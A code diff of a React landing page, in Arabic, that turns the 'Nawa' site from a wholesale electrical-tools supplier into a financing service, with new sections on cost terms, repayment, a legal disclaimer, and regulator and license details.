-          {/* Product axes — compact list, same visual weight as brands / pricing */}
-          <section id="products" className="cv-auto section-y-tight scroll-mt-24 border-y border-slate-200/80 bg-white/80">
+          {/* Services */}
+          <section id="services" className="cv-auto section-y-tight scroll-mt-24 border-y border-slate-200/80 bg-white/80">
             <div className="container-content">
               <div className="mx-auto max-w-3xl text-center">
-                <h2 className="font-display text-h2 font-bold text-slate-900">محاور التوريد</h2>
+                <h2 className="font-display text-h2 font-bold text-slate-900">خدماتنا التمويلية</h2>
                 <p className="mt-2 text-sm leading-relaxed text-slate-600 sm:mt-3 sm:text-lead sm:leading-[1.88]">
-                  ثمانية فئات تغطي طلب الجملة اليومي — نص فقط وواضح، بلا صور زينة.
+                  ثمانية محاور تغطي احتياجات شائعة — التفاصيل والأهلية تُحدَّد لكل عميل ولكل منتج.
                 </p>
               </div>
 
-              <div className="mx-auto mt-6 max-w-4xl overflow-hidden rounded-[var(--radius-xl)] border border-slate-200/90 bg-[#faf8f4]/90 shadow-sm sm:mt-8">
+              <div className="mx-auto mt-6 max-w-4xl overflow-hidden rounded-[var(--radius-xl)] border border-slate-200/90 bg-nawa-elevated/90 shadow-paper-sm sm:mt-8">
                 <ul className="divide-y divide-slate-200/80">
-                  {CATEGORIES.map((c, i) => (
+                  {SERVICES.map((c, i) => (
                     <li key={c.title} className="flex gap-3 px-4 py-3.5 transition hover:bg-white/70 sm:gap-4 sm:px-5 sm:py-4">
                       <span
                         className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-amber-100 text-xs font-extrabold text-amber-950 sm:h-10 sm:w-10 sm:text-sm"
@@ -506,47 +524,51 @@ export default function LandingPage() {
               </div>
 
               <p className="mx-auto mt-4 max-w-2xl text-center text-[11px] leading-relaxed text-slate-500 sm:mt-5 sm:text-xs">
-                التوفر والأسعار يُحدَّدان في المحادثة حسب الكمية والموعد — اطلب عرضًا من واتساب عند الحاجة.
+                المنتجات تخضع للتوفر والسياسة — راسلنا لواتساب لتحديد الملاءمة والمستندات المطلوبة.
               </p>
             </div>
           </section>
 
           {/* Bento why */}
-          <section id="why" className="cv-auto section-y scroll-mt-24 border-y border-slate-800/80 bg-slate-900 text-white">
+          <section
+            id="why"
+            className="cv-auto section-y scroll-mt-24 border-y border-slate-800/80 bg-institutional-dark text-white"
+          >
             <div className="container-content">
-              <h2 className="font-display text-h2 font-bold">لماذا نواة؟</h2>
+              <p className="kicker text-amber-200/90">التمويل المسؤول</p>
+              <h2 className="mt-2 font-display text-h2 font-bold">لماذا نواة؟</h2>
               <p className="mt-3 max-w-measure text-sm font-medium leading-[1.9] text-slate-300 sm:text-lead">
-                نجمع بين خبرة الجملة الطويلة ومعايير الخدمة الحديثة: شفافية في الطلبات، تنسيق
-                توريد مرن، وواجهة مريحة على الجوال وسطح المكتب — لأن قرار الشراء غالبًا يُتخذ
-                أثناء التنقّل.
+                نجمع بين خبرة طويلة في الخدمات المالية وبين واجهة واضحة للعميل: شفافية في التكلفة،
+                مسار طلب منظم، ومتابعة عبر القنوات المعتمدة — لأن قرار الاقتراض أو التمويل يحتاج
+                وقتا للمقارنة دون ضغط.
               </p>
               <div className="mt-12 grid gap-4 sm:gap-5 lg:grid-cols-3">
                 <div className="rounded-[var(--radius-xl)] border border-white/10 bg-white/5 p-6 sm:p-8 lg:col-span-2">
-                  <h3 className="font-display text-lg font-bold sm:text-xl">جملة حقيقية + شفافية MOQ</h3>
+                  <h3 className="font-display text-lg font-bold sm:text-xl">سياسة أهلية ومخاطر</h3>
                   <p className="mt-3 text-sm leading-relaxed text-slate-300 sm:text-[0.95rem]">
-                    نماذج السوق: شرائح سعر حسب الكمية، عرض سعر للمشاريع، وخصومات للحسابات
-                    المسجّلة. نوضح الحد الأدنى المتوقع لكل فئة — لتوفير وقت الطرفين.
+                    نقدّر القدرة على السداد والمخاطر الائتمانية وفق إطار داخلي معتمد — دون وعود
+                    بالقبول قبل استكمال المستندات والتحقق.
                   </p>
                 </div>
                 <div className="rounded-[var(--radius-xl)] border border-amber-400/35 bg-gradient-to-br from-amber-500/25 to-transparent p-6 sm:p-8">
-                  <h3 className="font-display text-lg font-bold text-amber-100 sm:text-xl">واتساب أولًا</h3>
+                  <h3 className="font-display text-lg font-bold text-amber-100 sm:text-xl">قنوات التواصل</h3>
                   <p className="mt-3 text-sm font-medium leading-[1.9] text-amber-50/95 sm:text-[0.95rem]">
-                    قناة واتساب للمتابعة اليومية: قوائم أسعار، تأكيد كميات، ومستندات عند الطلب —
-                    مع الحفاظ على أرشفة الطلبات كما يتوقع عمل الجملة.
+                    واتساب للاستفسار الأولي والمتابعة ضمن سياسة الخصوصية — مع توجيهك للمستندات
+                    الرسمية عند الحاجة.
                   </p>
                 </div>
                 <div className="rounded-[var(--radius-xl)] border border-white/10 bg-white/5 p-6 sm:p-8">
-                  <h3 className="font-display text-lg font-bold sm:text-xl">مواصفات ومستندات</h3>
+                  <h3 className="font-display text-lg font-bold sm:text-xl">عقود وشفافية</h3>
                   <p className="mt-3 text-sm font-medium leading-[1.9] text-slate-300 sm:text-[0.95rem]">
-                    نركّز على وضوح الصنف والدفعات والمواعيد؛ عند الطلب نرفق ما يلزم من بيانات فنية
-                    أو فواتير بما يتوافق مع أسلوب عملكم.
+                    العرض والعقد يحددان التكلفة والجدولة والالتزامات — اقرأ الشروط قبل التوقيع
+                    واطلب التوضيح عند أي استفسار.
                   </p>
                 </div>
                 <div className="rounded-[var(--radius-xl)] border border-white/10 bg-white/5 p-6 sm:p-8 lg:col-span-2">
-                  <h3 className="font-display text-lg font-bold sm:text-xl">تغطية وتنسيق تسليم</h3>
+                  <h3 className="font-display text-lg font-bold sm:text-xl">نطاق الخدمة</h3>
                   <p className="mt-3 text-sm leading-relaxed text-slate-300 sm:text-[0.95rem]">
-                    نحدد نطاق التوصيل والمواعيد وفق المخزون والكمية — بلا وعود عامة بلا تفاصيل،
-                    كما يتوقع شركاء الجملة من علاقة طويلة الأمد.
+                    نستقبل طلبات من مختلف المحافظات وفق القنوات المعتمدة — مع استكمال الملفات
+                    والمتابعة حسب سياسة المنتج دون التزام زمني عام قبل مراجعة الملف.
                   </p>
                 </div>
               </div>
@@ -556,12 +578,13 @@ export default function LandingPage() {
           {/* How it works */}
           <section id="process" className="cv-auto section-y scroll-mt-24">
             <div className="container-content">
-              <h2 className="font-display text-h2 font-bold text-slate-900">كيف نشتغل؟</h2>
+              <p className="kicker text-amber-900/95">من الاستفسار إلى الصرف</p>
+              <h2 className="mt-2 font-display text-h2 font-bold text-slate-900">كيف تتم الموافقة؟</h2>
               <div className="mt-10 grid gap-4 sm:grid-cols-2 sm:gap-5 lg:grid-cols-4">
                 {STEPS.map((s) => (
                   <div
                     key={s.t}
-                    className="relative rounded-[var(--radius-xl)] border border-slate-200 bg-white p-5 shadow-card sm:p-6"
+                    className="relative rounded-[var(--radius-xl)] border border-slate-200/90 border-s-[3px] border-s-amber-600/50 bg-white p-5 shadow-paper sm:p-6"
                   >
                     <span className="font-display text-3xl font-bold text-amber-500/95 sm:text-4xl">
                       {s.t}
@@ -577,15 +600,17 @@ export default function LandingPage() {
           </section>
 
           {/* Pricing models */}
-          <section className="cv-auto section-y bg-white">
+          <section id="pricing" className="cv-auto section-y scroll-mt-24 bg-white">
             <div className="container-content">
-              <h2 className="font-display text-h2 font-bold text-slate-900">نماذج التسعير في الجملة</h2>
+              <p className="kicker text-amber-900/95">التكلفة والشروط الإطارية</p>
+              <h2 className="mt-2 font-display text-h2 font-bold text-slate-900">جدول مفاهيم التكلفة</h2>
               <p className="mt-3 max-w-measure text-lead font-medium leading-[1.88] text-slate-700">
-                نطبّق ممارسات الجملة المعتادة ونختار النموذج الأنسب لحجم تعاملكم وتكرار طلباتكم.
+                ما يلي إطار إعلامي — التفاصيل الملزمة تأتي في العرض والعقد المعتمد بعد الموافقة. لا
+                تُعد هذه الصفحة عرض تمويل ملزمًا.
               </p>
 
               <div className="mt-8 space-y-3 md:hidden">
-                {PRICING.map(([title, desc]) => (
+                {TERMS_TABLE.map(([title, desc]) => (
                   <div
                     key={title}
                     className="rounded-[var(--radius-lg)] border border-slate-200 bg-[#faf8f4] p-4 shadow-sm"
@@ -600,13 +625,16 @@ export default function LandingPage() {
                 <table className="w-full border-collapse text-start text-sm lg:text-[0.95rem]">
                   <thead className="bg-slate-50 text-slate-600">
                     <tr>
-                      <th className="px-4 py-3.5 font-semibold sm:px-6">النموذج</th>
-                      <th className="px-4 py-3.5 font-semibold sm:px-6">متى يُستخدم</th>
+                      <th className="px-4 py-3.5 font-semibold sm:px-6">البند</th>
+                      <th className="px-4 py-3.5 font-semibold sm:px-6">ماذا يعني عمليًا؟</th>
                     </tr>
                   </thead>
                   <tbody className="divide-y divide-slate-100 bg-white">
-                    {PRICING.map(([a, b]) => (
-                      <tr key={a} className="transition hover:bg-slate-50/90">
+                    {TERMS_TABLE.map(([a, b], i) => (
+                      <tr
+                        key={a}
+                        className={`transition hover:bg-slate-50/90 ${i % 2 === 1 ? 'bg-slate-50/55' : ''}`}
+                      >
                         <td className="px-4 py-4 font-bold text-slate-900 sm:px-6 sm:py-5">{a}</td>
                         <td className="px-4 py-4 text-slate-600 sm:px-6 sm:py-5">{b}</td>
                       </tr>
@@ -622,14 +650,14 @@ export default function LandingPage() {
             <div className="container-content grid gap-6 sm:gap-8 lg:grid-cols-2">
               <div className="rounded-[var(--radius-xl)] border border-slate-200 bg-[#f0ede6] p-6 shadow-card sm:p-8 lg:p-10">
                 <h2 className="font-display text-xl font-bold text-slate-900 sm:text-2xl">
-                  التوصيل والتغطية
+                  التغطية والخدمة
                 </h2>
                 <p className="mt-3 text-sm leading-relaxed text-slate-600 sm:text-[0.95rem]">
-                  نغطي جميع محافظات مصر، مع تنسيق الموعد حسب المخزون وحجم الطلب. نطاق الخدمة
-                  واضح ومباشر بدون وعود عامة.
+                  نستقبل الطلبات ومتابعة الملفات من مختلف المحافظات — دون أن يعني ذلك التزامًا
+                  زمنيًا أو بالموافقة قبل التحقق من الأهلية والمستندات.
                 </p>
                 <ul className="mt-6 flex flex-wrap gap-2 sm:gap-2.5">
-                  {DELIVERY_GOVERNORATES.map((x) => (
+                  {SERVICE_COVERAGE_GOVERNORATES.map((x) => (
                     <li
                       key={x}
                       className="rounded-full border border-slate-200/90 bg-white px-3 py-2 text-xs font-semibold text-slate-700 min-[400px]:px-4 sm:text-sm"
@@ -639,30 +667,39 @@ export default function LandingPage() {
                   ))}
                 </ul>
               </div>
-              <div className="rounded-[var(--radius-xl)] border border-slate-200 bg-white p-6 shadow-card sm:p-8 lg:p-10">
-                <h2 className="font-display text-xl font-bold text-slate-900 sm:text-2xl">طرق الدفع</h2>
-                <ul className="mt-6 space-y-4 text-sm text-slate-600 sm:text-[0.95rem]">
+              <div className="overflow-hidden rounded-[var(--radius-xl)] border border-slate-200/90 bg-white shadow-paper">
+                <div className="border-b border-amber-900/10 bg-gradient-to-l from-amber-50/90 to-white px-6 py-4 sm:px-8">
+                  <p className="kicker text-amber-900/90">الشروط المالية</p>
+                  <h2 className="mt-1 font-display text-xl font-bold text-slate-900 sm:text-2xl">
+                    السداد والتحصيل
+                  </h2>
+                </div>
+                <ul className="space-y-4 px-6 pb-2 pt-6 text-sm text-slate-600 sm:px-8 sm:text-[0.95rem]">
                   <li className="flex gap-3">
                     <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-emerald-500" />
-                    تحويل بنكي مع إشعار تحويل.
+                    أقساط أو جدولة سداد وفق العقد (تحويل بنكي، خصم تلقائي عند التوفر، أو قنوات
+                    يُذكر اسمها في الاتفاق).
                   </li>
                   <li className="flex gap-3">
                     <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-emerald-500" />
-                    كاش عند الاستلام عند الاتفاق.
+                    سداد مبكر أو جزئي يخضع لسياسة المنتج — كما في العرض المعتمد.
                   </li>
                   <li className="flex gap-3">
                     <span className="mt-1.5 h-2 w-2 shrink-0 rounded-full bg-emerald-500" />
-                    شروط آجل للحسابات المعتمدة.
+                    التأخير قد يرتب غرامات أو فوائد تأخير وسجلات ائتمانية — راجع جدول التأخير في
+                    العقد.
                   </li>
                 </ul>
-                <a
-                  href={waHref}
-                  target="_blank"
-                  rel="noopener noreferrer"
-                  className="focus-ring mt-8 inline-flex min-h-touch w-full items-center justify-center rounded-2xl bg-slate-900 px-5 py-3.5 text-sm font-bold text-white transition hover:bg-slate-800 sm:w-auto"
-                >
-                  ناقش الشروط على واتساب
-                </a>
+                <div className="px-6 pb-6 pt-4 sm:px-8">
+                  <a
+                    href={waHref}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="focus-ring inline-flex min-h-touch w-full items-center justify-center rounded-2xl bg-slate-900 px-5 py-3.5 text-sm font-bold text-white transition hover:bg-slate-800 sm:w-auto"
+                  >
+                    ناقش الشروط على واتساب
+                  </a>
+                </div>
               </div>
             </div>
           </section>
@@ -672,7 +709,7 @@ export default function LandingPage() {
             <div className="container-content">
               <h2 className="font-display text-h2 font-bold text-slate-900">ماذا يقول العملاء</h2>
               <p className="mt-2 text-sm text-slate-500 sm:text-[0.95rem]">
-                أمثلة لأسلوب التعامل — يمكن استبدالها بشهادات بأسماء حقيقية عند الرغبة.
+                تجارب عامة — يمكن استبدالها بشهادات موقّعة أو دراسات حالة عند التوفر.
               </p>
               <div className="mt-8 grid gap-4 sm:mt-10 sm:gap-5 lg:grid-cols-3">
                 {TESTIMONIALS.map((t) => (
@@ -719,11 +756,11 @@ export default function LandingPage() {
           <section className="cv-auto section-y border-t border-slate-200 bg-gradient-to-l from-amber-100/85 via-white to-sky-50/85">
             <div className="container-content text-center">
               <h2 className="font-display text-[clamp(1.35rem,3.5vw+0.5rem,2.15rem)] font-extrabold leading-snug text-slate-900">
-                ابدأ طلبك الآن — ردّ عملي خلال ساعة هدف
+                ابدأ باستفسار تمويلي — ردّ عملي خلال أوقات العمل
               </h2>
               <p className="mx-auto mt-3 max-w-measure text-sm leading-relaxed text-slate-600 sm:text-lead">
-                أرسل الصنف والكمية والموقع. سنرجع بعرض أو بنطاق سعر واضح — بدون جمل إعلانية
-                فارغة.
+                اذكر نوع الطلب باختصار. سنوجّهك للمستندات والخطوات — دون التزام بالموافقة قبل
+                التحقق.
               </p>
               <a
                 href={waHref}
@@ -736,15 +773,52 @@ export default function LandingPage() {
             </div>
           </section>
 
-          <footer className="border-t border-slate-200 bg-white py-8 sm:py-10">
-            <div className="container-content flex flex-col gap-3 text-center text-sm text-slate-500 sm:flex-row sm:items-center sm:justify-between sm:text-start">
-              <p>© {new Date().getFullYear()} نواة الجملة — توريد الأدوات الكهربائية بالجملة</p>
-              <a
-                href="#faq"
-                className="text-slate-500 underline-offset-2 transition hover:text-slate-800 hover:underline"
-              >
-                أسئلة شائعة
-              </a>
+          <footer className="border-t border-slate-200/90 bg-nawa-elevated/80 py-8 sm:py-10">
+            <div className="container-content flex flex-col gap-6 text-sm text-slate-600">
+              <div className="rounded-[var(--radius-lg)] border border-slate-200/90 bg-white/80 p-4 text-start text-xs leading-relaxed text-slate-600 sm:p-5 sm:text-[0.8125rem]">
+                <p className="font-bold text-slate-800">إفصاح قانوني</p>
+                <p className="mt-2">
+                  المحتوى إعلامي ولا يُعد عرض تمويل ملزمًا. أي تمويل يخضع للأهلية والموافقة
+                  والتوقيع على العقد. ليس استشارة استثمارية أو ضمانًا بالقبول. راجع الشروط والأحكام
+                  قبل الالتزام.
+                </p>
+                <p className="mt-3 text-slate-700">
+                  <span className="font-semibold text-slate-900">الجهة الرقابية:</span>{' '}
+                  <span>{regulatorAr}</span>
+                </p>
+                <div className="mt-4 flex flex-wrap items-center gap-2.5 border-t border-slate-200/80 pt-4">
+                  <span className="font-semibold text-slate-900">رقم الترخيص</span>
+                  <span
+                    dir="ltr"
+                    translate="no"
+                    className="inline-flex min-h-[2.25rem] items-center rounded-lg border border-slate-300/90 bg-white px-3 py-1.5 font-mono text-sm font-bold tracking-[0.08em] text-slate-900 shadow-sm tabular-nums sm:text-base"
+                  >
+                    {licenseNumber}
+                  </span>
+                </div>
+              </div>
+              <div className="flex flex-col gap-4 text-center sm:flex-row sm:items-start sm:justify-between sm:text-start">
+                <div>
+                  <p className="font-semibold text-slate-800">© {new Date().getFullYear()} نواة</p>
+                  <p className="mt-1 text-xs text-slate-500 sm:text-sm">
+                    خدمات تمويلية مرخّصة — قروض وتسييل سيولة وفق الشروط والأهلية
+                  </p>
+                </div>
+                <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 sm:justify-end">
+                  <a
+                    href="#pricing"
+                    className="text-slate-600 underline-offset-2 transition hover:text-slate-900 hover:underline"
+                  >
+                    التكلفة والشروط
+                  </a>
+                  <a
+                    href="#faq"
+                    className="text-slate-600 underline-offset-2 transition hover:text-slate-900 hover:underline"
+                  >
+                    أسئلة شائعة
+                  </a>
+                </div>
+              </div>
             </div>
           </footer>
         </main>
@@ -752,7 +826,7 @@ export default function LandingPage() {
 
       {unlocked && (
         <>
-          <MobileActionBar waHref={waHref} catalogHref={catalogHref} />
+          <MobileActionBar waHref={waHref} catalogHref={docsHref} />
           <WhatsAppFab href={waHref} />
         </>
       )}
